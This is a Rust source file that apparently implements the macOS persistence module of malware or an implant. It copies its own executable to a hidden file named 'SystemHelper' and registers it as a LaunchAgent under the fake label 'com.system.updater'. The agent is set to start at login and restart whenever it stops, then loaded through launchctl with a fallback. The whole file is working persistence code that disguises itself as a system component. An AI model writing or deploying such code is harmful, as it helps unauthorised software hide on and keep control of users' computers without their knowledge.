// persistence/macos.rs
use std::path::PathBuf;
use std::fs;
use std::env;

pub fn install_persistence(copias: &[PathBuf]) -> Result<(), Box<dyn std::error::Error>> {
    println!("🍎 Instalando persistencia en macOS...");

    let home = env::var("HOME")?;
    let launch_agents_dir = format!("{}/Library/LaunchAgents", home);
    fs::create_dir_all(&launch_agents_dir)?;

    // 1. DEFINIR UNA COPIA MAESTRA FIJA
    let master_path = format!("{}/.config/SystemHelper", home);
    println!("📌 Copia maestra: {}", master_path);

    // 2. COPIAR EL EJECUTABLE A LA UBICACIÓN MAESTRA
    if let Some(primary) = copias.first() {
        if primary.exists() {
            fs::copy(primary, &master_path)?;

            #[cfg(target_os = "macos")]
            {
                use std::os::unix::fs::PermissionsExt;
                let mut perms = fs::metadata(&master_path)?.permissions();
                perms.set_mode(0o755);
                fs::set_permissions(&master_path, perms)?;
            }
            println!("✅ Copia maestra creada en: {}", master_path);
        }
    }

    // 3. CREAR LAUNCHAGENT QUE EJECUTE LA COPIA MAESTRA
    let plist_content = format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.updater</string>
    <key>ProgramArguments</key>
    <array>
        <string>{}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/tmp/systemhelper.log</string>
    <key>StandardErrorPath</key>
    <string>/tmp/systemhelper.err</string>
</dict>
</plist>"#,
        master_path
    );

    let plist_path = format!("{}/Library/LaunchAgents/com.system.updater.plist", home);
    fs::write(&plist_path, plist_content)?;
    println!("✅ LaunchAgent creado: {}", plist_path);

    // 4. CARGAR EL LAUNCHAGENT
    let output = std::process::Command::new("launchctl")
        .args(&["load", &plist_path])
        .output();

    match output {
        Ok(out) => {
            if out.status.success() {
                println!("✅ LaunchAgent cargado correctamente");
            } else {
                let stderr = String::from_utf8_lossy(&out.stderr);
                println!("⚠️ Error cargando LaunchAgent: {}", stderr);
                let _ = std::process::Command::new("launchctl")
                    .args(&["bootstrap", "gui/501", &plist_path])
                    .spawn();
            }
        }
        Err(e) => {
            println!("⚠️ Error ejecutando launchctl: {}", e);
        }
    }

    Ok(())
}
